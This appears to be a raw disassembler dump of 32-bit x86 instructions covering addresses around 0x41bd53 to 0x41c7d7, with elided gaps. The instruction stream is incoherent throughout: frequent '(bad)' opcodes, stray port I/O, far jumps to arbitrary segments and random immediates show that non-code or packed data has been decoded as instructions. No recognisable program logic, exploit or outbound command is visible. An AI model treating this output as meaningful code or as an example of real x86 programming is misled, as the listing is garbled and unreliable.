  41bd53:	ss nop
  41bd55:	adc    al,BYTE PTR [ebp-0x37]
  41bd58:	adc    dl,dl
  41bd5a:	mov    es,WORD PTR [esi]
  41bd5c:	das    
  41bd5d:	mul    eax
  41bd5f:	jb     0x41bd10
  41bd61:	pop    edi
  41bd62:	icebp  
  41bd63:	mov    eax,0xe5076fbe
  41bd68:	jmp    0x30a7:0x945ed64b
  41bd6f:	cmp    DWORD PTR [esi+esi*8-0x31],eax
  41bd73:	mov    cl,0x29
  41bd75:	jbe    0x41bd78
  41bd77:	xor    eax,0x95c58be4
  41bd7c:	inc    ebx
  41bd7d:	and    cl,BYTE PTR [ecx]
  41bd7f:	adc    al,BYTE PTR [edi+0x16]
  41bd82:	test   eax,0x182c1c02
  41bd87:	fiadd  DWORD PTR [ebx+ebp*2+0x7ff84dfe]
  41bd8e:	sub    al,0xf
  41bd90:	(bad)  
  41bd91:	test   BYTE PTR [ebx],0xe7
  41bd94:	and    DWORD PTR [ebp+0x56803c42],ecx
  41bd9a:	cmp    ah,BYTE PTR [ebp+0x3393f9d3]
  41bda0:	js     0x41bdc8
  41bda2:	mov    WORD PTR [ecx-0x18],ss
  41bda5:	popf   
  41bda6:	sub    dl,BYTE PTR [edi+0x1]
  41bda9:	adc    DWORD PTR [esi+0x37d540bc],esp
  41bdaf:	outs   dx,DWORD PTR ds:[esi]
  41bdb0:	adc    ch,dh
  41bdb2:	je     0x41bd64
  41bdb4:	pop    ebp
  41bdb5:	inc    ebp
  41bdb6:	scas   eax,DWORD PTR es:[edi]
  41bdb7:	adc    BYTE PTR [ecx-0x38f5ee02],0x60
  41bdbe:	jnp    0x41bdcd
  41bdc0:	dec    ebx
  41bdc1:	stc    
  41bdc2:	and    al,0xdd
  41bdc4:	call   0x69e99933
  41bdc9:	loopne 0x41bdc6
  41bdcb:	rcr    BYTE PTR [eax-0x5c6ac186],cl
  41bdd1:	fisubr DWORD PTR [ecx+0x194678a1]
  41bdd7:	js     0x41be57
  41bdd9:	ds pop esi
  41bddb:	loopne 0x41be19
  41bddd:	call   0x5aee3a12
  41bde2:	lea    eax,ds:0xe03362e7
  41bde8:	popa   
  41bde9:	je     0x41bdba
  41bdeb:	pop    ebp
  41bdec:	imul   ebp,DWORD PTR [ebx-0x35],0x4bacb112
  41bdf3:	pop    ds
  41bdf4:	push   eax
  41bdf5:	push   esp
  41bdf6:	push   ss
  41bdf7:	xchg   ebp,eax
  41bdf8:	inc    ebx
  41bdf9:	cmp    dh,bl
  41bdfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdfc:	xchg   edi,eax
  41bdfd:	and    cl,BYTE PTR [ecx+0x371f99c6]
  41be03:	jp     0x41be72
  41be05:	cmp    edx,ecx
  41be07:	add    BYTE PTR [edi-0x79],dh
  41be0a:	mov    esp,DWORD PTR [ecx-0xedd840d]
  41be10:	mov    bl,0xfd
  41be12:	xor    BYTE PTR [ebx-0x43],0x84
  41be16:	cmp    bh,ch
  41be18:	inc    edx
  41be19:	mov    edx,0xd8a19ea8
  41be1e:	mov    bh,0x92
  41be20:	rcr    DWORD PTR [edx],0x7f
  41be23:	(bad)  
  41be24:	out    dx,al
  41be25:	in     al,0x2a
  41be27:	push   ds
  41be28:	enter  0x24e6,0xf
  41be2c:	dec    ecx
  41be2d:	jnp    0x41bdf5
  41be2f:	jne    0x41be0c
  41be31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be32:	mov    ds:0xc27526b7,al
  41be37:	shl    BYTE PTR [edi],cl
  41be39:	push   ds
  41be3a:	jmp    0x41be35
  41be3c:	jmp    0x41be90
  41be3e:	sub    DWORD PTR [edx+0xcc78],0x0
	...
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	pandn  mm3,QWORD PTR [ebx+0x2d9ec879]
  41bec6:	add    DWORD PTR [eax],eax
  41bec8:	test   BYTE PTR [eax],0x0
  41becb:	add    cl,bh
  41becd:	mov    ds:0x9a6f595f,al
  41bed2:	sbb    BYTE PTR ds:0x32a60550,dh
  41bed8:	repnz add ah,BYTE PTR [edx+edx*8+0xb]
  41bedd:	sub    eax,0x69999860
  41bee2:	sar    BYTE PTR [eax+0x2237915e],0xb1
  41bee9:	inc    edx
  41beea:	cwde   
  41beeb:	gs cli 
  41beed:	xor    esp,DWORD PTR [ecx-0x39]
  41bef0:	dec    edx
  41bef1:	mov    DWORD PTR [ebx+ebx*2],esi
  41bef4:	push   si
  41bef7:	mov    ebx,0x2a10164c
  41befc:	popa   
  41befd:	push   0xffffff85
  41beff:	add    eax,0x19ece06c
  41bf04:	inc    ebp
  41bf05:	sti    
  41bf06:	add    al,0x5c
  41bf08:	aaa    
  41bf09:	outs   dx,BYTE PTR ds:[esi]
  41bf0a:	inc    ebp
  41bf0b:	out    dx,al
  41bf0c:	mov    ebx,DWORD PTR [edx]
  41bf0e:	push   es
  41bf0f:	or     eax,0xfe8bd02a
  41bf14:	lods   eax,DWORD PTR ds:[esi]
  41bf15:	sahf   
  41bf16:	nop
  41bf17:	int    0xaa
  41bf19:	mov    ecx,0xb3a0e0cf
  41bf1e:	xchg   esi,eax
  41bf1f:	popf   
  41bf20:	adc    edi,edi
  41bf22:	shl    dh,0x59
  41bf25:	jmp    0x41bf92
  41bf27:	inc    ebx
  41bf28:	inc    edi
  41bf29:	and    al,0x2b
  41bf2b:	mov    ecx,0x94640015
  41bf30:	ja     0x41bf55
  41bf32:	sbb    cl,BYTE PTR [ebx+eax*8-0x7b0d4cc]
  41bf39:	cdq    
  41bf3a:	and    ah,BYTE PTR [edi]
  41bf3c:	out    dx,eax
  41bf3d:	das    
  41bf3e:	ficom  DWORD PTR [ecx+eax*8-0x6366b60e]
  41bf45:	jmp    0x6553f622
  41bf4a:	ins    BYTE PTR es:[edi],dx
  41bf4b:	xchg   ebx,eax
  41bf4c:	test   eax,0xc27397fa
  41bf51:	mov    edi,0x27454357
  41bf56:	ins    DWORD PTR es:[edi],dx
  41bf57:	add    BYTE PTR [eax],al
  41bf59:	mov    esi,0xcd5356ad
  41bf5e:	mov    ecx,0xa634427
  41bf63:	dec    esp
  41bf64:	jno    0x41bf15
  41bf66:	mov    ebx,0x602960ba
  41bf6b:	ret    
  41bf6c:	or     esi,DWORD PTR [ecx]
  41bf6e:	mov    eax,0xfdbf442d
  41bf73:	sbb    ecx,edx
  41bf75:	cwde   
  41bf76:	or     BYTE PTR [ecx],bl
  41bf78:	mov    ebp,0xb1104d09
  41bf7d:	jg     0x41bf19
  41bf7f:	and    DWORD PTR [esi+0x1b],esp
  41bf82:	fdiv   QWORD PTR [esi]
  41bf84:	ins    BYTE PTR es:[edi],dx
  41bf85:	push   ds
  41bf86:	and    al,BYTE PTR [eax-0x7f]
  41bf89:	mov    ebp,0xcb225ed1
  41bf8e:	gs push ecx
  41bf90:	xchg   edx,eax
  41bf91:	lahf   
  41bf92:	xor    eax,0x52f8e18f
  41bf97:	dec    eax
  41bf98:	aam    0xf0
  41bf9a:	mov    ebp,0x615264f7
  41bf9f:	sbb    eax,0x326612a3
  41bfa4:	adc    eax,0x310cb376
  41bfa9:	push   0x24f6efda
  41bfae:	dec    ecx
  41bfaf:	lock push eax
  41bfb1:	mov    ds:0x9fbd61da,al
  41bfb6:	out    dx,eax
  41bfb7:	inc    esi
  41bfb8:	pop    eax
  41bfb9:	add    BYTE PTR ds:0xd1ece5cb,ah
  41bfbf:	push   ebx
  41bfc0:	sub    eax,0x58
	...
  41c031:	add    BYTE PTR [eax],al
  41c033:	add    dh,al
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi+0x7ebb9a81]
  41c041:	push   ds
  41c042:	mov    bl,0xed
  41c044:	xchg   esp,eax
  41c045:	add    DWORD PTR cs:[eax],eax
  41c048:	test   BYTE PTR [eax],0x0
  41c04b:	add    BYTE PTR [eax],bh
  41c04d:	xchg   ebp,eax
  41c04e:	pusha  
  41c04f:	loopne 0x41c07c
  41c051:	je     0x41c02e
  41c053:	test   BYTE PTR [eax+ecx*8],al
  41c056:	shr    al,cl
  41c058:	icebp  
  41c059:	arpl   WORD PTR ds:0x9c6bf37f,si
  41c05f:	xlat   BYTE PTR ds:[ebx]
  41c060:	ret    0x5c70
  41c063:	jmp    0x41c066
  41c065:	cdq    
  41c066:	mov    ebx,0x91a9ff45
  41c06b:	mov    esi,0x5162f804
  41c070:	loop   0x41c08e
  41c072:	jbe    0x41c0ab
  41c074:	jb     0x41c0b7
  41c076:	dec    eax
  41c077:	dec    eax
  41c078:	lds    ecx,FWORD PTR [ebp+edx*2+0x796bb1ea]
  41c07f:	dec    esp
  41c080:	je     0x41c011
  41c082:	les    esi,FWORD PTR [ebx+0x2]
  41c085:	sub    dh,BYTE PTR [edx+0x32]
  41c088:	pushf  
  41c089:	xchg   ebp,eax
  41c08a:	add    eax,0x68a1b7a6
  41c08f:	jmp    0x2ccd:0x147bc697
  41c096:	mov    edx,0xa4241a41
  41c09b:	je     0x41c025
  41c09d:	jmp    0xf1af:0x25568449
  41c0a4:	jne    0x41c0b5
  41c0a6:	and    eax,0xea7063d8
  41c0ab:	or     edx,DWORD PTR [edx]
  41c0ad:	fimul  DWORD PTR [eax]
  41c0af:	adc    cl,BYTE PTR [esi]
  41c0b1:	ins    BYTE PTR es:[edi],dx
  41c0b2:	mov    eax,DWORD PTR [ecx+0xc]
  41c0b5:	vaddpd xmm3,xmm6,XMMWORD PTR [ebx-0x6b2e3df]
  41c0bd:	retf   
  41c0be:	mov    al,0xde
  41c0c0:	rcl    DWORD PTR [ebx+0x25],cl
  41c0c3:	retf   
  41c0c4:	or     DWORD PTR [ecx+0x2834a8bf],edi
  41c0ca:	mov    ecx,0xd8f99b39
  41c0cf:	sbb    esi,DWORD PTR [ecx]
  41c0d1:	jb     0x41c060
  41c0d3:	xor    edi,DWORD PTR ds:0x24f14281
  41c0d9:	jmp    0x41c122
  41c0db:	add    DWORD PTR [edx],0xe
  41c0de:	mov    al,ds:0x88096aec
  41c0e3:	jo     0x41c092
  41c0e5:	std    
  41c0e6:	mov    dh,0x3
  41c0e8:	test   BYTE PTR [ebp-0x14],0x50
  41c0ec:	cmovae ebp,DWORD PTR [edx]
  41c0ef:	icebp  
  41c0f0:	dec    edi
  41c0f1:	shr    eax,cl
  41c0f3:	je     0x41c11d
  41c0f5:	in     al,dx
  41c0f6:	push   ebp
  41c0f7:	sub    edx,DWORD PTR [eax-0x4c]
  41c0fa:	shr    esi,0x8b
  41c0fd:	sub    eax,0xdea47509
  41c102:	mov    al,ds:0x552455cd
  41c107:	adc    DWORD PTR [ebp-0x1a],ecx
  41c10a:	mov    ah,0x35
  41c10c:	push   cs
  41c10d:	and    BYTE PTR [edx],dh
  41c10f:	mov    eax,ds:0x998b050c
  41c114:	shl    BYTE PTR [ecx+0x6c],0x49
  41c118:	mov    ds:0xceabd7d5,eax
  41c11d:	lock mov bl,0xe8
  41c120:	xor    eax,0xacd4366b
  41c125:	sbb    BYTE PTR [ecx+0x7a],0xdf
  41c129:	pop    ebp
  41c12a:	jmp    0x41c184
  41c12c:	add    al,0x96
  41c12e:	add    al,0xdf
  41c130:	mov    edi,DWORD PTR [esi]
  41c132:	cmp    al,0x6
  41c134:	jb     0x41c140
  41c136:	sub    al,BYTE PTR [esi+0x1df516d2]
  41c13c:	sub    ecx,DWORD PTR [eax-0x7a]
  41c13f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c140:	fwait
  41c141:	jb     0x41c143
	...
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x1fc81fc7
  41c1c4:	mov    ch,BYTE PTR [edi]
  41c1c6:	add    DWORD PTR [eax],eax
  41c1c8:	test   BYTE PTR [eax],0x0
  41c1cb:	add    BYTE PTR [ebp+0xa835c68],bl
  41c1d1:	in     eax,0x57
  41c1d3:	and    DWORD PTR [ecx-0x69],edi
  41c1d6:	mov    eax,ds:0x5503e797
  41c1db:	and    al,0xe6
  41c1dd:	cmp    al,0x3a
  41c1df:	out    0x43,al
  41c1e1:	sar    BYTE PTR [esp+esi*4],0x28
  41c1e5:	sbb    ah,BYTE PTR [edi+edi*4-0x48]
  41c1e9:	push   0x43
  41c1eb:	ror    ecx,cl
  41c1ed:	clc    
  41c1ee:	bnd jl 0x41c173
  41c1f1:	mov    BYTE PTR [esi+0xfaaffef],ah
  41c1f7:	xchg   edi,eax
  41c1f8:	mov    es,edx
  41c1fa:	mov    esi,0xbabbcbf2
  41c1ff:	out    dx,al
  41c200:	clc    
  41c201:	and    BYTE PTR ds:0x2696dc25,cl
  41c207:	cmp    eax,0xadac58fb
  41c20c:	xor    ch,BYTE PTR [edx]
  41c20e:	je     0x41c28b
  41c210:	mov    bh,0xdc
  41c212:	sub    eax,0x369d8a69
  41c217:	add    ecx,DWORD PTR [esi]
  41c219:	adc    al,0x3b
  41c21b:	std    
  41c21c:	push   cs
  41c21d:	pushf  
  41c21e:	pop    esp
  41c21f:	lods   al,BYTE PTR ds:[esi]
  41c220:	int3   
  41c221:	ins    BYTE PTR es:[edi],dx
  41c222:	and    DWORD PTR [ebx],ebx
  41c224:	dec    DWORD PTR [ebx-0x2754bf13]
  41c22a:	jo     0x41c26b
  41c22c:	mov    ah,0xbf
  41c22e:	fisttp DWORD PTR [esp+edx*8+0x17]
  41c232:	sub    bh,BYTE PTR [esi]
  41c234:	scas   eax,DWORD PTR es:[edi]
  41c235:	pusha  
  41c236:	in     eax,dx
  41c237:	lea    ecx,[eax]
  41c239:	int3   
  41c23a:	mov    ebx,0x704c46a9
  41c23f:	or     eax,DWORD PTR [ecx]
  41c241:	xor    al,0xa4
  41c243:	pop    es
  41c244:	sbb    al,0x8e
  41c246:	cli    
  41c247:	out    dx,eax
  41c248:	push   es
  41c249:	leave  
  41c24a:	jg     0x41c1f4
  41c24c:	iret   
  41c24d:	push   ecx
  41c24e:	neg    DWORD PTR [eax]
  41c250:	aas    
  41c251:	mov    ds:0xc3c8d5d4,eax
  41c256:	or     BYTE PTR [esi-0x24cd0349],0xf0
  41c25d:	int    0xd8
  41c25f:	ret    
  41c260:	xchg   edx,edi
  41c262:	fld    DWORD PTR [esi]
  41c264:	sti    
  41c265:	(bad)  
  41c266:	sbb    BYTE PTR [ebx],0xf8
  41c269:	inc    esi
  41c26a:	sti    
  41c26b:	call   0xd1a:0x9a44e51a
  41c272:	mov    esi,0xfa990565
  41c277:	cs call 0x86734ecc
  41c27d:	fadd   QWORD PTR [ebp+0x73847f1c]
  41c283:	dec    edx
  41c284:	sub    DWORD PTR [esi+0x349c2007],0x432995e9
  41c28e:	ja     0x41c26e
  41c290:	jmp    0xf6ee342e
  41c295:	imul   edx,DWORD PTR [eax],0x7f4bf219
  41c29b:	add    edx,DWORD PTR [esp+ecx*2-0x6e]
  41c29f:	mov    ds:0x49390611,al
  41c2a4:	pop    ds
  41c2a5:	jnp    0x41c259
  41c2a7:	retf   
  41c2a8:	xor    ecx,ecx
  41c2aa:	outs   dx,BYTE PTR ds:[esi]
  41c2ab:	ret    
  41c2ac:	js     0x41c2d5
  41c2ae:	mov    edi,0x9e8f3b98
  41c2b3:	stos   DWORD PTR es:[edi],eax
  41c2b4:	(bad)  
  41c2b5:	(bad)  
  41c2b6:	fwait
  41c2b7:	inc    esi
  41c2b8:	pop    ebp
  41c2b9:	sbb    bl,BYTE PTR [ebx-0xbbb1a0e]
  41c2bf:	sub    BYTE PTR [ecx],0xb0
	...
  41c332:	add    BYTE PTR [eax],al
  41c334:	dec    eax
  41c335:	or     eax,0xbb5dab1d
  41c33a:	(bad)  
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	xchg   DWORD PTR [ecx],esp
  41c342:	or     DWORD PTR [ecx+0x13080],ebp
  41c348:	test   BYTE PTR [eax],0x0
  41c34b:	add    BYTE PTR [esi],dl
  41c34d:	lods   al,BYTE PTR ds:[esi]
  41c34e:	add    ebx,DWORD PTR [eax-0x43]
  41c351:	inc    BYTE PTR [esi-0x2a292393]
  41c357:	push   ss
  41c358:	and    BYTE PTR [edx+0x41],cl
  41c35b:	scas   eax,DWORD PTR es:[edi]
  41c35c:	xchg   ebx,eax
  41c35d:	jnp    0x41c2ea
  41c35f:	out    0x8c,al
  41c361:	fimul  WORD PTR [eax+ebp*4-0x37bb1639]
  41c368:	fisubr DWORD PTR gs:[ebp-0x80]
  41c36c:	sbb    BYTE PTR [ebx+0x1b6963fa],ah
  41c372:	push   0x611716a1
  41c377:	pushf  
  41c378:	in     eax,0x2
  41c37a:	ins    DWORD PTR es:[edi],dx
  41c37b:	std    
  41c37c:	xor    eax,0x2e053cd9
  41c381:	nop
  41c382:	ss jne 0x41c377
  41c385:	aad    0x4d
  41c387:	push   ss
  41c388:	cli    
  41c389:	mov    ch,0xc9
  41c38b:	ja     0x41c3ef
  41c38d:	push   0x293f7000
  41c392:	mov    cl,0x54
  41c394:	popf   
  41c395:	not    esi
  41c397:	or     DWORD PTR [ecx],esp
  41c399:	xchg   esp,eax
  41c39a:	and    al,0xf7
  41c39c:	ins    BYTE PTR es:[edi],dx
  41c39d:	push   0xa475e42f
  41c3a2:	pushf  
  41c3a3:	add    BYTE PTR [ebx-0x2de4754d],dh
  41c3a9:	(bad)  
  41c3aa:	fs inc esp
  41c3ac:	sub    bl,BYTE PTR [edx+0x40b69904]
  41c3b2:	dec    edx
  41c3b3:	mov    ebp,?
  41c3b5:	inc    esi
  41c3b6:	push   ebx
  41c3b7:	aad    0x83
  41c3b9:	push   esp
  41c3ba:	in     al,dx
  41c3bb:	mov    ebx,0xb68ebb74
  41c3c0:	outs   dx,DWORD PTR ds:[esi]
  41c3c1:	stos   DWORD PTR es:[edi],eax
  41c3c2:	outs   dx,DWORD PTR ds:[esi]
  41c3c3:	xor    al,0x88
  41c3c5:	lahf   
  41c3c6:	fild   DWORD PTR [esi]
  41c3c8:	rcr    cl,0x8e
  41c3cb:	push   es
  41c3cc:	mov    ebx,0x8bd8288
  41c3d1:	cli    
  41c3d2:	jge    0x41c3a9
  41c3d4:	push   ebp
  41c3d5:	or     eax,0xc92a512d
  41c3da:	dec    ebp
  41c3db:	pop    es
  41c3dc:	push   ebx
  41c3dd:	inc    ebx
  41c3de:	sti    
  41c3df:	mov    dl,0x1f
  41c3e1:	jmp    FWORD PTR [edx-0x6f]
  41c3e4:	fld    QWORD PTR [edi]
  41c3e6:	(bad)  
  41c3e7:	scas   al,BYTE PTR es:[edi]
  41c3e8:	dec    edi
  41c3e9:	dec    ebx
  41c3ea:	in     eax,0xf8
  41c3ec:	sti    
  41c3ed:	sub    eax,0x8cd7abd3
  41c3f2:	js     0x41c46e
  41c3f4:	xchg   ebp,eax
  41c3f5:	sub    dh,BYTE PTR [eax]
  41c3f7:	xchg   edi,eax
  41c3f8:	and    BYTE PTR [edx],ah
  41c3fa:	xchg   DWORD PTR [ecx-0x53ad1fc],edi
  41c400:	scas   al,BYTE PTR es:[edi]
  41c401:	mov    ebp,cs
  41c403:	mov    DWORD PTR [edi+0x25],eax
  41c406:	pop    esp
  41c407:	lds    edx,FWORD PTR [ecx+0x4b]
  41c40a:	test   DWORD PTR [eax],eax
  41c40c:	call   0x1ab9:0x4259eecc
  41c413:	test   eax,0x8d676a7b
  41c418:	pop    ss
  41c419:	jnp    0x41c46c
  41c41b:	inc    eax
  41c41c:	div    bl
  41c41e:	fsub   st(7),st
  41c420:	or     ebp,DWORD PTR [ebp-0x25]
  41c423:	sbb    ah,BYTE PTR [edi+0x518b8a6a]
  41c429:	cli    
  41c42a:	mov    edx,0xd119e10a
  41c42f:	es mov ah,0x9
  41c432:	(bad)  
  41c433:	retf   0x2227
  41c436:	ret    0xba3d
  41c439:	sub    eax,0x94fc5f41
  41c43e:	outs   dx,DWORD PTR ds:[esi]
  41c43f:	or     bl,al
  41c441:	jl     0x41c443
	...
  41c4b3:	add    ah,dl
  41c4b5:	in     al,dx
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx+0x7bc8fd4a]
  41c4c4:	jbe    0x41c4f7
  41c4c6:	add    DWORD PTR [eax],eax
  41c4c8:	test   BYTE PTR [eax],0x0
  41c4cb:	add    BYTE PTR [esi+0xff58a6f],dl
  41c4d1:	mov    ds:0x84d3dddd,eax
  41c4d6:	div    BYTE PTR [edi-0x5b]
  41c4d9:	pop    ds
  41c4da:	push   edx
  41c4db:	push   es
  41c4dc:	xor    al,0xc4
  41c4de:	xor    al,0xc
  41c4e0:	int    0x61
  41c4e2:	(bad)
  41c4e6:	mov    al,0xb0
  41c4e8:	jo     0x41c520
  41c4ea:	cli    
  41c4eb:	cmp    BYTE PTR [esi-0x71d40f8],ch
  41c4f1:	and    BYTE PTR es:[edx-0x53],dh
  41c4f5:	cmp    DWORD PTR [ebp+0x102c8e96],edx
  41c4fb:	jl     0x41c51c
  41c4fd:	imul   eax,DWORD PTR [ebp-0x21],0xfffffff2
  41c501:	sar    DWORD PTR [edx-0x7b50f89d],0x50
  41c508:	lods   al,BYTE PTR ds:[esi]
  41c509:	test   al,0x6c
  41c50b:	xchg   esi,eax
  41c50c:	mov    ds:0xc25fd73a,eax
  41c511:	adc    eax,0x86b165cb
  41c516:	mov    edi,0x7d4a6616
  41c51b:	xchg   esp,eax
  41c51c:	dec    ecx
  41c51d:	mov    ecx,0x8028cb9c
  41c522:	xor    BYTE PTR [ecx-0x7],dl
  41c525:	mov    dh,0xd9
  41c527:	imul   edi,DWORD PTR [ebp+0x46],0xffffff98
  41c52b:	cmc    
  41c52c:	jge    0x41c545
  41c52e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c52f:	loope  0x41c4f2
  41c531:	sahf   
  41c532:	ror    DWORD PTR ds:0x1a44974c,cl
  41c538:	mov    esp,0x962a8d07
  41c53d:	fsub   DWORD PTR [ebx+esi*1]
  41c540:	ins    DWORD PTR es:[edi],dx
  41c541:	add    DWORD PTR [ebp-0x719cb422],ebx
  41c547:	and    eax,0xca8d481c
  41c54c:	es push 0x6d
  41c54f:	(bad)  
  41c550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c551:	mov    esp,0xfaaac6ae
  41c556:	pusha  
  41c557:	mov    ?,ecx
  41c559:	cmc    
  41c55a:	neg    DWORD PTR [ebp+0x51]
  41c55d:	imul   ecx,DWORD PTR [esi+0x3a],0x46ea6b77
  41c564:	jns    0x41c5c6
  41c566:	fs shl ah,cl
  41c569:	popa   
  41c56a:	sub    BYTE PTR [eax+0x6084944a],dl
  41c570:	push   0xffffffad
  41c572:	fmul   DWORD PTR [edi]
  41c574:	rol    BYTE PTR [edi+edi*4+0x406fba4b],cl
  41c57b:	mov    ecx,0xd8765aa9
  41c580:	cld    
  41c581:	in     eax,dx
  41c582:	mov    eax,0xea31d928
  41c587:	adc    ecx,DWORD PTR [eax]
  41c589:	pop    ebp
  41c58a:	and    ebx,DWORD PTR [ebp-0x35]
  41c58d:	jecxz  0x41c51e
  41c58f:	cld    
  41c590:	inc    esp
  41c591:	mov    al,ds:0xdb285127
  41c596:	jo     0x41c5f3
  41c598:	fs stos DWORD PTR es:[edi],eax
  41c59a:	cld    
  41c59b:	push   eax
  41c59c:	inc    esp
  41c59d:	sub    BYTE PTR [ecx+eiz*1-0x5110ad05],bh
  41c5a4:	adc    BYTE PTR [esi-0x77],ch
  41c5a7:	adc    eax,ebx
  41c5a9:	jmp    0xf869:0x76653810
  41c5b0:	mov    ah,0x9b
  41c5b2:	mov    ah,0xb4
  41c5b4:	loopne 0x41c56f
  41c5b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5b7:	jb     0x41c5a4
  41c5b9:	xchg   esp,eax
  41c5ba:	add    DWORD PTR [ebx-0x37],0x67
  41c5be:	cli    
  41c5bf:	mov    ecx,0xf7ce
	...
  41c634:	test   al,0x63
  41c636:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41c63c:	out    dx,eax
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	xor    BYTE PTR [edx],bl
  41c642:	rcl    dh,0x6c
  41c645:	xor    al,BYTE PTR [ecx]
  41c647:	add    dh,dh
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    BYTE PTR [ebx],cl
  41c64d:	pop    edx
  41c64e:	int3   
  41c64f:	adc    ecx,ebp
  41c651:	mov    al,cl
  41c653:	aas    
  41c654:	mov    BYTE PTR [edx+0x72],bl
  41c657:	xchg   ecx,eax
  41c658:	not    DWORD PTR [ecx+0x57e6c364]
  41c65e:	popa   
  41c65f:	jns    0x41c6b0
  41c661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c662:	and    DWORD PTR [ebx+0x5b58ccfb],0xffffff9a
  41c669:	scas   eax,DWORD PTR es:[edi]
  41c66a:	push   edi
  41c66b:	add    eax,esi
  41c66d:	and    ah,dh
  41c66f:	scas   al,BYTE PTR es:[edi]
  41c670:	hlt    
  41c671:	inc    edx
  41c672:	div    DWORD PTR [edx]
  41c674:	les    esp,FWORD PTR [edi+0x50fb2605]
  41c67a:	int    0xb
  41c67c:	xchg   ebx,eax
  41c67d:	lahf   
  41c67e:	and    cl,BYTE PTR [eax+0x39]
  41c681:	dec    esp
  41c682:	repz push eax
  41c684:	cmp    eax,0xfc05be0a
  41c689:	inc    ebx
  41c68a:	test   DWORD PTR [esi+ebx*1],ebx
  41c68d:	jge    0x41c6a1
  41c68f:	pop    eax
  41c690:	xchg   ebp,ebx
  41c692:	ror    DWORD PTR [esi],0xeb
  41c695:	leave  
  41c696:	out    dx,eax
  41c697:	dec    edi
  41c698:	jns    0x41c648
  41c69a:	sub    dl,BYTE PTR [eax]
  41c69c:	mov    bl,BYTE PTR ds:0xdd06f46f
  41c6a2:	adc    eax,0xf15a2214
  41c6a7:	sub    eax,DWORD PTR [ecx-0x7]
  41c6aa:	in     eax,dx
  41c6ab:	lahf   
  41c6ac:	iret   
  41c6ad:	test   DWORD PTR [esi-0x7c08d65],esp
  41c6b3:	pop    esp
  41c6b4:	sub    ecx,edi
  41c6b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6b7:	and    bl,BYTE PTR [eax]
  41c6b9:	dec    eax
  41c6ba:	aaa    
  41c6bb:	xchg   edi,eax
  41c6bc:	xchg   ebx,eax
  41c6bd:	adc    BYTE PTR [ecx],al
  41c6bf:	pop    ecx
  41c6c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6c1:	jmp    0x41c66f
  41c6c3:	fnstcw WORD PTR [esi]
  41c6c5:	cmp    cl,ah
  41c6c7:	inc    esi
  41c6c8:	cmp    ch,BYTE PTR [eax-0x13c2650b]
  41c6ce:	adc    dl,BYTE PTR [ebx-0x54]
  41c6d1:	jmp    0x68849916
  41c6d6:	mov    esi,0x7a464139
  41c6db:	mov    esi,0x8f0a3dcd
  41c6e0:	mov    ebp,0x65d67942
  41c6e5:	sti    
  41c6e6:	xchg   ebx,eax
  41c6e7:	dec    esi
  41c6e8:	jno    0x41c6e2
  41c6ea:	hlt    
  41c6eb:	stos   DWORD PTR es:[edi],eax
  41c6ec:	pop    edi
  41c6ed:	push   cs
  41c6ee:	pop    esp
  41c6ef:	xchg   edi,eax
  41c6f0:	ds jmp 0xaf50:0x6aceb9be
  41c6f8:	sar    BYTE PTR ds:0xd9340af2,cl
  41c6fe:	loopne 0x41c6d4
  41c700:	fimul  DWORD PTR [ebp+esi*4-0x68]
  41c704:	dec    edx
  41c705:	mov    eax,0x94e99b10
  41c70a:	retf   0xc34d
  41c70d:	sbb    BYTE PTR [ecx+0xb],bl
  41c710:	lahf   
  41c711:	sahf   
  41c712:	movaps xmm2,xmm3
  41c715:	add    al,0xf4
  41c717:	(bad)  [edi]
  41c719:	adc    bl,ah
  41c71b:	ret    
  41c71c:	sahf   
  41c71d:	adc    dh,ch
  41c71f:	in     eax,dx
  41c720:	lods   al,BYTE PTR ds:[esi]
  41c721:	xchg   ebp,eax
  41c722:	dec    edi
  41c723:	dec    ecx
  41c724:	cmp    bl,cl
  41c726:	test   BYTE PTR [edi],cl
  41c728:	push   esp
  41c729:	gs int 0x49
  41c72c:	leave  
  41c72d:	or     al,0xb4
  41c72f:	(bad)  
  41c730:	inc    BYTE PTR [edi]
  41c732:	leave  
  41c733:	inc    edi
  41c734:	or     DWORD PTR [edi],eax
  41c736:	retf   0xa2c7
  41c739:	inc    edi
  41c73a:	push   edx
  41c73b:	dec    edx
  41c73c:	sbb    BYTE PTR [ebx+0x69],ah
  41c73f:	jg     0x41c755
  41c741:	sub    al,BYTE PTR [eax]
	...
  41c7b3:	add    BYTE PTR [edx-0x8b13804],cl
  41c7b9:	jg     0x41c746
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0x9e1b6d54
  41c7c3:	jg     0x41c827
  41c7c5:	xor    eax,DWORD PTR [ecx]
  41c7c7:	add    dh,dh
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    BYTE PTR [edi+0xb6647f5],bl
  41c7d1:	sti    
  41c7d2:	mov    edi,0x85e9b2b5
  41c7d7:	push   edx
